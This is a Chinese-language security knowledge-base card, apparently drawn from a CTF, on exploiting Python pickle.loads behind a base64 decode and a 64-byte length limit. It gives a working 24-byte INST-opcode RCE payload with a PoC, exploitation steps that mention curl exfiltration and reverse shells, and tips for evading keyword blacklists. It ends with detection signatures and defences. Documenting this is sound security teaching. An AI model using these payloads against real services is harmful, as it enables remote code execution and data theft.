---
id: web-python-deserialization-pickle-minimal-payload-under-length-limit
title: base64 + pickle.loads 入口只加 64 字节长度上限：protocol 0 的 INST 最短串 24 字节（base64 后 32 字符）照样 RCE，长度限制不构成任何防护
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-minimal-payload-length-limit-bypass
tags:
- python
- deserialization
- pickle
- rce
- base64
- length-limit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W4B
  verified_at: '2026-11-08T21:58:49+08:00'
  notes: 已对照原文核对（本次核对未读取图片，仅依据正文 server.py 的 base64 解码 + len(data)>64 + pickle.loads）：原文场景（每行一个 base64 ingredient、超 64 字节直接 return、之后 pickle.loads）与「长度限制不构成任何边界」的结论成立，PoC 中的 os.system 调用与原文 a='V__setstate__ ... (S"cat re*" ... ios ... system ... .' 的写法对应。核对时已修正卡内三处技术细节：①原文 payload 实测 38 字节（base64 后 52 字符），卡内原写「约 24 字节 / base64 后 32 字符」，已改为「V 前缀变体 38 字节」；②pickletools 反汇编显示该串走 protocol 0 的 i(INST 'os system')，STOP 时栈上残留 __setstate__ 字符串（loads 容忍但不参与执行），卡内原「BUILD 等价 __setstate__ / V 省掉 GLOBAL 的 c 前缀」的解释不成立，已改为 INST 语义（并用同结构无害串 (S"hello-inst" ibuiltins print . 实测确认 INST 即「调用可调用对象(其参数)」，未执行任何原文命令）；③PoC 注释里的 base64 串解码得到首字节 W 的畸形串，已替换为实测正确的 base64。真正 24 字节最小串为不含 V 前缀的 (S"cat re*" ios system .，已在卡内作为主 payload。未验证点：未在原文容器中实际执行 RCE payload，命令回显/外带方式为通用补充；INST 在 Python 3.8+ 为 deprecated opcode，已在变体段注明。
url: /docs/web/python/deserialization/web-python-deserialization-pickle-minimal-payload-under-length-limit/
draft: false
kb_aliases:
- pickle 长度限制绕过
- 最短 pickle payload
- INST opcode 构造
- (S"cat re*" ios system 最小串
- base64 输入的 pickle.loads
---

## 一句话结论

服务端把用户提交的每行 base64 解码后直接 `pickle.loads()`，仅用 `len(data) > 64` 做"防护"：这不构成任何防护 —— 一个 protocol 0 的最短串 `(S"cat re*"\nios\nsystem\n.`（用 `i`（INST）直接调用 `os.system`）只有 **24 字节**（base64 后 32 字符），再多带一个 `V` 前缀的变体也只有 38 字节（base64 后 52 字符），两者都在 64 字节上限内且能带完整命令；唯一真正的边界是 `RestrictedUnpickler`/白名单 `find_class`/签名校验。

## 原理

- `pickle.loads` 在反序列化阶段就会执行 GLOBAL/INST/REDUCE/`BUILD` 指定的可调用对象，**解析即执行**，与"数据是否可信"无关。
- 最短路径不是 `GLOBAL('os','system') + REDUCE`（那要多一个字符串对象和 REDUCE 栈操作），而是 protocol 0 的 `INST`（`i`）—— 它把 `MARK` 之后压栈的全部对象当作参数，直接调用 `<module> <name>`：
  - `(` 压入 `MARK`；
  - `S"cat re*"` 压入命令串作为唯一参数；
  - `ios\nsystem\n` 是 `INST 'os system'`（模块名与函数名分两行）；
  - `.` 结束 —— 解析到 `INST` 时就会执行 `os.system("cat re*")`。
  - 由此得到 24 字节的最小串 `(S"cat re*"\nios\nsystem\n.`。若在开头再加 `V__setstate__\n`（压一个字符串后不再使用，`STOP` 时栈上残留，`loads` 容忍），长度变成 38 字节，仍是可用变体但**并不更短**，也不改变执行路径。
- 关键压缩点：模块名 `os` 只有 2 字符、函数名 `system` 6 字符、命令串按需替代；`S`（STRING）与 `V`（UNICODE）都是"压一个字符串"的最短写法。
- 因此"限制长度"只挡得住长脚本，挡不住利用：24 字节的 payload 已能执行任意单条命令（`cat /flag*`、`cp /flag /app/static`、`curl 外带`）。
- 长度上限真正的安全含义应为"限制放大器"，而不是"限制利用"；正确的做法是白名单类 + HMAC 签名（session 类数据），或干脆不反序列化不可信输入。

## 触发条件

- 应用把用户可控数据（HTTP 参数、上传文件、会话内容）送去 `pickle.loads`，且只做了长度限制、关键字黑名单或 base64 解码等"格式层"校验。
- 未使用 `RestrictedUnpickler`、`find_class` 白名单、`pickle.Unpickler` 子类或签名校验。
- 服务进程内可导入 `os`/`subprocess`/`builtins` 等模块（几乎总是成立）。

## 利用步骤

1. 找入口：`b64decode` 后 `pickle.loads` 的接口（本例是每行一个 base64 ingredient）。
2. 先发一个良性对象确认协议与解码方式（如 `(S"abc"\n.` 或 `I1\n.`）。
3. 构造最短 payload：`(S"cat re*"\nios\nsystem\n.`（24 字节；多带 `V__setstate__\n` 前缀的变体 38 字节），确认其字节长度在限制内。
4. 服务端执行后：命令输出不会直接回显 → 改为把 flag 写到可访问路径（如静态目录）、或 `curl` 外带到自控地址、或反弹 shell。
5. 校验：本地 `python -c "import pickle,base64; pickle.loads(base64.b64decode(p))"` 观察命令是否执行（在隔离环境）。

## PoC

```python
import base64

# 24 字节的文本协议 payload，等价于 os.system("cat re*")：INST('os','system') 直接调用
payload = b'(S"cat re*"\nios\nsystem\n.'
print(len(payload), base64.b64encode(payload).decode())
# 24 b'KFMiY2F0IHJlKiIKaW9zCnN5c3RlbQou'

# 变体：多带一个 V 前缀（栈上残留 __setstate__ 字符串，loads 容忍），38 字节
variant = b'V__setstate__\n(S"cat re*"\nios\nsystem\n.'
print(len(variant), base64.b64encode(variant).decode())
# 38 b'Vl9fc2V0c3RhdGVfXwooUyJjYXQgcmUqIgppb3MKc3lzdGVtCi4='
```

```text
# 最小化思路（协议 0，全部可打印）
(                    # MARK：之后压栈的对象都是 INST 的参数
S"cat re*"\n         # 压入唯一参数（S = 短字符串；也可换成任意命令）
ios\n                # INST 的模块名
system\n             # INST 的名称
.                    # STOP；解析到 INST 时即执行 os.system("cat re*")
```

## 变体与关联

- 想用 `GLOBAL('os','system') + S'cmd' + REDUCE` 时略长但更通用（`INST` 自 Python 3.8 起为 deprecated opcode，个别版本可能不再接受）；或用 `builtins.eval`、`subprocess.check_output`。
- 黑名单只查明文时，可对模块名做 `sys.modules['os']` 拼接、或用 `pydoc`/`platform`/`ctypes` 等间接 sink 绕词表。
- 有长度限制 + 黑名单时，优先选"短名字 + 短 sink"（`os.system` 比 `subprocess.run` 短；`/tmp/x` 比长路径短）。
- 相关：`pickle.loads` 入口本身是一个原语；只有配合"能回显/能落文件/能出网"才构成完整利用链。

## 检测与防御

- 检测：请求体含 `\x80\x04`（协议 4）或 base64 解码后出现 `__setstate__`/`GLOBAL`/`INST`/`REDUCE`/`posix`；应用进程异常 `execve` 子进程。
- 防御：绝不 `pickle.loads` 不可信数据（用 JSON/MessagePack）；必须用时改 `RestrictedUnpickler` 且白名单 `find_class`；会话数据用签名（HMAC）保护；长度限制只作为辅助，不当作安全边界。
